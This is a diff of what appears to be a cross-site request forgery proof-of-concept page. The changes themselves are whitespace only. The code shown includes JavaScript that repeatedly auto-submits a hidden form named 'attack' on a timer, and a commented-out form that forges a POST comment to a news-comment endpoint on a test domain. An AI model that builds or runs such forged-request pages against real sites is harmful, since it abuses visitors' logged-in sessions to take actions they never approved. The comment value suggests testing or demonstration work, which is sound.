@@ -3,17 +3,20 @@
 <script type="text/javascript">
     let qtd = 0;
     let seconds = 2;
+
     const limit = 5;
 
     function send() {
         if (qtd < limit) {
             document.attack.submit();
         }
+        
         qtd++;
     }
 
     function start() {
         seconds *= 10;
+
         window.setInterval(() => {
             send()
         }, seconds);
@@ -35,7 +38,6 @@ The ID can be found in the source code of the page
 </form>
     
 <!-- Method 2
-
 <form action="https://www.test.com/site/index.php/news/comments/add/ID-HERE" name="attack" method="POST" target="_blank">
     <input type="text" name="comment" value="CSRF POST DETECTED">
     <input type="hidden" name="action" value="true">
